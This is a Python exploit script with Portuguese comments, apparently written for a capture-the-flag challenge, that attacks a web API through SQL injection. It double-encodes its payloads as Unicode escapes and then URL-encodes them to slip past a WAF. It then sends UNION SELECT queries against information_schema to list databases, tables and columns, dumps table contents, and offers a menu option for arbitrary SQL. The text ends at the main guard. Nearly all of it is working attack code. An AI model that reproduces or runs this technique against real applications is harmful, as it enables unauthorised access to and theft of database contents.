#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import sys
from urllib.parse import quote

class SQLInjectionExploit:
    def __init__(self, target_url="http://10.10.0.17/api/create"):
        self.url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Cookie': 'PHPSESSID=76be84de1d7f18c3ffc8bd93ad11cd7c',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
    
    def double_encode(self, payload):
        """Aplica duplo encoding: Unicode + URL encode"""
        # Passo 1: Converter para Unicode
        unicode_payload = ""
        for char in payload:
            unicode_payload += "\\u{:04x}".format(ord(char))
        
        # Passo 2: URL encode (substitui \ por %5c)
        encoded = unicode_payload.replace("\\", "%5c")
        return encoded
    
    def inject(self, sql_payload, base_value="SilvaSec"):
        """Executa a injeção SQL"""
        # Prepara a payload completa
        full_payload = base_value + sql_payload
        encoded_payload = self.double_encode(full_payload)
        
        # Monta o JSON
        data = {
            "name": "Jonathan",
            "nick": encoded_payload
        }
        
        # Envia a requisição
        post_data = f"data={json.dumps(data)}"
        
        try:
            response = self.session.post(self.url, data=post_data)
            return response
        except Exception as e:
            print(f"[-] Erro na requisição: {e}")
            return None
    
    def extract_data(self, response):
        """Extrai dados da resposta"""
        results = []
        try:
            data = response.json()
            if 'hacker' in data:
                for entry in data['hacker']:
                    # Procura por resultados injetados (geralmente com ID baixo)
                    if entry['id'] <= 5:
                        results.append({
                            'id': entry['id'],
                            'name': entry['name'],
                            'nick': entry['nick']
                        })
        except:
            pass
        return results
    
    def get_databases(self):
        """Lista todos os bancos de dados"""
        print("\n[*] Listando bancos de dados...")
        sql = "' UNION SELECT 1,2,schema_name FROM information_schema.schemata-- "
        response = self.inject(sql)
        
        if response and response.status_code == 200:
            results = self.extract_data(response)
            databases = [r['nick'] for r in results]
            return databases
        return []
    
    def get_tables(self, database=None):
        """Lista tabelas do banco"""
        print(f"\n[*] Listando tabelas{f' do banco {database}' if database else ''}...")
        
        if database:
            sql = f"' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_schema='{database}'-- "
        else:
            sql = "' UNION SELECT 1,2,table_name FROM information_schema.tables-- "
        
        response = self.inject(sql)
        
        if response and response.status_code == 200:
            results = self.extract_data(response)
            tables = [r['nick'] for r in results]
            return tables
        return []
    
    def get_columns(self, table, database=None):
        """Lista colunas de uma tabela"""
        print(f"\n[*] Listando colunas da tabela {table}...")
        
        sql = f"' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='{table}'"
        if database:
            sql += f" AND table_schema='{database}'"
        sql += "-- "
        
        response = self.inject(sql)
        
        if response and response.status_code == 200:
            results = self.extract_data(response)
            columns = [r['nick'] for r in results]
            return columns
        return []
    
    def dump_table(self, table, columns=None, database=None):
        """Extrai dados de uma tabela"""
        print(f"\n[*] Extraindo dados da tabela {table}...")
        
        if not columns:
            # Tenta com nomes comuns de colunas
            columns = ['flag', 'value', 'data', 'content', 'secret']
        
        for column in columns:
            sql = f"' UNION SELECT 1,2,{column} FROM "
            if database:
                sql += f"{database}."
            sql += f"{table}-- "
            
            response = self.inject(sql)
            
            if response and response.status_code == 200:
                results = self.extract_data(response)
                if results:
                    print(f"\n[+] Dados encontrados na coluna '{column}':")
                    for r in results:
                        print(f"    {r['nick']}")
                    return results
        
        return []
    
    def find_flag(self):
        """Busca automática pela flag"""
        print("\n[!] Iniciando busca automática pela flag...")
        
        # 1. Procurar tabelas com nomes sugestivos
        flag_keywords = ['flag', 'secret', 'ctf', 'challenge', 'key']
        
        for keyword in flag_keywords:
            sql = f"' UNION SELECT 1,2,table_name FROM information_schema.tables WHERE table_name LIKE '%{keyword}%'-- "
            response = self.inject(sql)
            
            if response and response.status_code == 200:
                results = self.extract_data(response)
                for r in results:
                    table_name = r['nick']
                    print(f"\n[+] Tabela encontrada: {table_name}")
                    
                    # Tentar extrair dados diretamente
                    self.dump_table(table_name)

def main():
    print("""
    ╔═══════════════════════════════════════════╗
    ║     SQL Injection Double Encoding CTF     ║
    ║           WAF Bypass Exploit              ║
    ╚═══════════════════════════════════════════╝
    """)
    
    exploit = SQLInjectionExploit()
    
    # Menu interativo
    while True:
        print("\n[MENU]")
        print("1. Busca automática pela flag")
        print("2. Listar bancos de dados")
        print("3. Listar todas as tabelas")
        print("4. Extrair tabela específica")
        print("5. Executar SQL customizado")
        print("0. Sair")
        
        choice = input("\nEscolha uma opção: ")
        
        if choice == "1":
            exploit.find_flag()
        
        elif choice == "2":
            databases = exploit.get_databases()
            if databases:
                print("\n[+] Bancos de dados encontrados:")
                for db in databases:
                    print(f"    - {db}")
        
        elif choice == "3":
            tables = exploit.get_tables()
            if tables:
                print("\n[+] Tabelas encontradas:")
                for table in tables:
                    print(f"    - {table}")
        
        elif choice == "4":
            table = input("Nome da tabela: ")
            exploit.dump_table(table)
        
        elif choice == "5":
            sql = input("SQL Payload (sem o prefixo SilvaSec): ")
            response = exploit.inject(sql)
            if response:
                results = exploit.extract_data(response)
                if results:
                    print("\n[+] Resultados:")
                    for r in results:
                        print(f"    ID: {r['id']}, Name: {r['name']}, Nick: {r['nick']}")
                else:
                    print("[-] Nenhum resultado encontrado")
        
        elif choice == "0":
            print("\n[*] Saindo...")
            break

if __name__ == "__main__":
